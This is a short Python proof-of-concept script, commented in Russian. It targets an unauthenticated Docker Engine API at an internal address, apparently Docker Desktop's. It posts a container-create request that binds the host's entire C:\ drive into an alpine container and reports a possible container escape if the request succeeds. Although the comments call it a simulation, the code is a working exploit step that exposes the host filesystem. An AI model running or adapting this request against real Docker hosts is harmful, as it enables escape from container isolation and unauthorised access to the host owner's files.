import requests
import json

# Условный endpoint Docker Engine API без аутентификации
docker_api_url = "http://192.168.65.7:2375/containers/create"

# Имитация payload для создания контейнера с монтированием хоста (C:\ на Windows)
payload = {
    "Image": "alpine",
    "HostConfig": {
        "Binds": ["C:/:/host"]  # Монтирование корня хоста
    }
}

try:
    response = requests.post(docker_api_url, json=payload, verify=False)
    if response.status_code == 201:
        print("[+] Потенциальная уязвимость обнаружена. Контейнер создан, возможен escape:")
        print(response.text[:200])  # Первые 200 символов ответа
    else:
        print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)
except Exception as e:
    print("[-] Ошибка запроса (эмуляция):", str(e))
